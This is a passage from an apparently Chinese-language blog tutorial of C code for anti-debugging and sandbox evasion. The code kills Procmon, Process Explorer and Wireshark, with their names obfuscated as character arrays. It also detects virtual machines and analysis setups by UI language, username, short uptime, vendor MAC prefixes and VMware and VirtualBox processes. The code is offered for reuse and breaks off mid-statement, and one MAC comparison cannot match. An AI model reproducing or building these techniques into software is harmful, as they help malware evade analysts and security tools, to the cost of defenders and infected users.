class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;, <span class="comment">// Procmon</span></span><br><span class="line">        &#123; <span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;, <span class="comment">// Procmon 64-bit</span></span><br><span class="line">        &#123; <span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;, <span class="comment">// Process Explorer</span></span><br><span class="line">        &#123; <span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;, <span class="comment">// Process Explorer 64-bit</span></span><br><span class="line">        &#123; <span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125; <span class="comment">// Wireshark</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> numElements = <span class="keyword">sizeof</span>(t) / <span class="keyword">sizeof</span>(t[<span class="number">0</span>]);  <span class="comment">// 计算数组中进程名称的数量。</span></span><br><span class="line">    BOOL anyFailure = FALSE;  <span class="comment">// 初始化标志，用于跟踪是否有任何进程终止失败。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numElements; i++) &#123;  <span class="comment">// 遍历每个进程名称。</span></span><br><span class="line">        <span class="keyword">if</span> (!TerminateDebuggingProcess(t[i])) &#123;  <span class="comment">// 尝试终止指定名称的进程。</span></span><br><span class="line">            anyFailure = TRUE;  <span class="comment">// 如果终止失败，更新标志。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (anyFailure) &#123;  <span class="comment">// 如果有任何终止失败的进程。</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n某些进程终止失败\n&quot;</span>);  <span class="comment">// 输出失败信息。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// 返回 0 表示程序执行完毕。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071302968.png" data-fancybox="true"/></div></div><h3 id="常规手段"><a href="#常规手段" class="headerlink" title="常规手段"></a>常规手段</h3><h4 id="检查语言"><a href="#检查语言" class="headerlink" title="检查语言"></a>检查语言</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查系统的用户界面语言是否是非中文</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">checkLan</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 获取当前用户默认的UI语言标识符</span></span><br><span class="line">    LANGID langId = GetUserDefaultUILanguage();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查语言ID的主要语言部分是否为中文</span></span><br><span class="line">    <span class="keyword">if</span> (PRIMARYLANGID(langId) == LANG_CHINESE) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 如果是中文，返回false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">// 如果不是中文，返回true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 调用 checkLan 函数并根据返回值输出对应信息</span></span><br><span class="line">    <span class="keyword">if</span> (checkLan()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system&#x27;s UI language is not Chinese.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system&#x27;s UI language is Chinese.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="检查用户名"><a href="#检查用户名" class="headerlink" title="检查用户名"></a>检查用户名</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查当前用户是否名为 &quot;admin&quot;</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">checkAdminUser</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">wchar_t</span> userName[UNLEN + <span class="number">1</span>];</span><br><span class="line">    DWORD userNameSize = UNLEN + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前计算机用户名</span></span><br><span class="line">    <span class="keyword">if</span> (GetUserNameW(userName, &amp;userNameSize)) &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Current User: %s\n&quot;</span>, userName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查用户名是否为&quot;admin&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (wcscmp(userName, <span class="string">L&quot;admin&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 用户名是 &quot;admin&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">// 用户名不是 &quot;admin&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Error getting user name. Error code: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 如果无法获取用户名，返回 false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (checkAdminUser()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The current user is not &#x27;admin&#x27;.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The current user is &#x27;admin&#x27;.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="检查开机时间"><a href="#检查开机时间" class="headerlink" title="检查开机时间"></a>检查开机时间</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查系统的开机时间是否少于10分钟</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">checkStartTime</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 获取系统自启动以来的运行时间（毫秒）</span></span><br><span class="line">    ULONG uptime = GetTickCount();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查运行时间是否少于10分钟（10分钟 = 10 * 60秒 = 600秒 = 600,000毫秒）</span></span><br><span class="line">    <span class="keyword">if</span> (uptime &gt;= <span class="number">10</span> * <span class="number">60</span> * <span class="number">1000</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 开机时间大于等于10分钟，返回 false</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">// 开机时间少于10分钟，返回 true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 调用 checkStartTime 函数并根据返回值输出对应信息</span></span><br><span class="line">    <span class="keyword">if</span> (checkStartTime()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system has been up for less than 10 minutes.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system has been up for 10 minutes or more.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="检查MAC地址"><a href="#检查MAC地址" class="headerlink" title="检查MAC地址"></a>检查MAC地址</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用#pragma comment指令链接Netapi32.lib库</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Netapi32.lib&quot;</span>)</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义适配器状态结构和名称缓冲区结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">ASTAT_</span> &#123;</span></span><br><span class="line">    ADAPTER_STATUS adapt;</span><br><span class="line">    NAME_BUFFER NameBuff[<span class="number">30</span>];</span><br><span class="line">&#125; ASTAT, * PASTAT;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取MAC地址的前三个字节并存储为字符串</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_3part_mac</span><span class="params">(<span class="built_in">string</span>&amp; mac)</span> &#123;</span><br><span class="line">    NCB Ncb;</span><br><span class="line">    ASTAT Adapter;</span><br><span class="line">    UCHAR uRetCode;</span><br><span class="line">    LANA_ENUM lenum;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;Ncb, <span class="number">0</span>, <span class="keyword">sizeof</span>(Ncb));</span><br><span class="line">    Ncb.ncb_command = NCBENUM;</span><br><span class="line">    Ncb.ncb_buffer = (UCHAR*)&amp;lenum;</span><br><span class="line">    Ncb.ncb_length = <span class="keyword">sizeof</span>(lenum);</span><br><span class="line">    uRetCode = Netbios(&amp;Ncb);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uRetCode != NRC_GOODRET) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Netbios枚举调用失败，错误代码: %d\n&quot;</span>, uRetCode);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; lenum.length; i++) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;Ncb, <span class="number">0</span>, <span class="keyword">sizeof</span>(Ncb));</span><br><span class="line">        Ncb.ncb_command = NCBRESET;</span><br><span class="line">        Ncb.ncb_lana_num = lenum.lana[i];</span><br><span class="line">        uRetCode = Netbios(&amp;Ncb);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (uRetCode != NRC_GOODRET) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Netbios重置调用失败，错误代码: %d\n&quot;</span>, uRetCode);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(&amp;Ncb, <span class="number">0</span>, <span class="keyword">sizeof</span>(Ncb));</span><br><span class="line">        Ncb.ncb_command = NCBASTAT;</span><br><span class="line">        Ncb.ncb_lana_num = lenum.lana[i];</span><br><span class="line">        strcpy_s((<span class="type">char</span>*)Ncb.ncb_callname, <span class="keyword">sizeof</span>(Ncb.ncb_callname), <span class="string">&quot;*&quot;</span>);</span><br><span class="line">        Ncb.ncb_buffer = (<span class="type">unsigned</span> <span class="type">char</span>*)&amp;Adapter;</span><br><span class="line">        Ncb.ncb_length = <span class="keyword">sizeof</span>(Adapter);</span><br><span class="line">        uRetCode = Netbios(&amp;Ncb);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (uRetCode == NRC_GOODRET) &#123;</span><br><span class="line">            <span class="type">char</span> tmp[<span class="number">128</span>];</span><br><span class="line">            sprintf_s(tmp, <span class="keyword">sizeof</span>(tmp), <span class="string">&quot;%02x-%02x-%02x&quot;</span>,</span><br><span class="line">                Adapter.adapt.adapter_address[<span class="number">0</span>],</span><br><span class="line">                Adapter.adapt.adapter_address[<span class="number">1</span>],</span><br><span class="line">                Adapter.adapt.adapter_address[<span class="number">2</span>]</span><br><span class="line">            );</span><br><span class="line">            mac = tmp;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Netbios状态调用失败，错误代码: %d\n&quot;</span>, uRetCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否在虚拟机环境中运行</span></span><br><span class="line">BOOL <span class="title function_">CheckMacAddress</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">string</span> mac;</span><br><span class="line">    get_3part_mac(mac);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mac == <span class="string">&quot;00-05-69&quot;</span> || mac == <span class="string">&quot;00-0c-29&quot;</span> || mac == <span class="string">&quot;00:1C:14&quot;</span> || mac == <span class="string">&quot;00-50-56&quot;</span> ||</span><br><span class="line">        mac == <span class="string">&quot;00-03-ff&quot;</span> || mac == <span class="string">&quot;08-00-27&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (CheckMacAddress()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;检测到虚拟机或安全工具环境。\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;未检测到虚拟机或安全工具环境。\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="检查进程"><a href="#检查进程" class="headerlink" title="检查进程"></a>检查进程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查进程列表中是否存在特定进程</span></span><br><span class="line">BOOL <span class="title function_">CheckSpecificProcesses</span><span class="params">(WCHAR* procname)</span> &#123;</span><br><span class="line">    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Error: Failed to create process snapshot: %ld\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line">    pe.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    BOOL res = Process32First(hSnapshot, &amp;pe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (res) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!wcscmp(pe.szExeFile, procname)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found process %ls is running，PID: %u\n&quot;</span>, procname, pe.th32ProcessID);</span><br><span class="line">            CloseHandle(hSnapshot);</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">        res = Process32Next(hSnapshot, &amp;pe);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CloseHandle(hSnapshot);</span><br><span class="line">    <span class="keyword">return</span> FALSE;  <span class="comment">// 未找到进程，返回 FALSE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 定义一个二维数组，包含需要检测和终止的进程名称。</span></span><br><span class="line">    WCHAR t[][<span class="number">18</span>] = &#123;</span><br><span class="line">        &#123; <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;, <span class="comment">// vmware.exe</span></span><br><span class="line">        &#123; <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;,             <span class="comment">// Vmtoolsd.exe</span></span><br><span class="line">        &#123; <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;,     <span class="comment">// Vmwaretrat.exe</span></span><br><span class="line">        &#123; <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;, <span class="comment">// Vmwareuser.exe</span></span><br><span class="line">        &#123; <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;, <span class="comment">// vboxservice.exe</span></span><br><span class="line">        &#123; <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;, <span class="comment">// vboxtray.exe</span></span><br><span class="line">        &#123; <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;, <span class="comment">// Vmacthlp.exe  </span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> numElements = <span class="keyword">sizeof</span>(t) / <span class="keyword">sizeof</span>(t[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numElements; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> 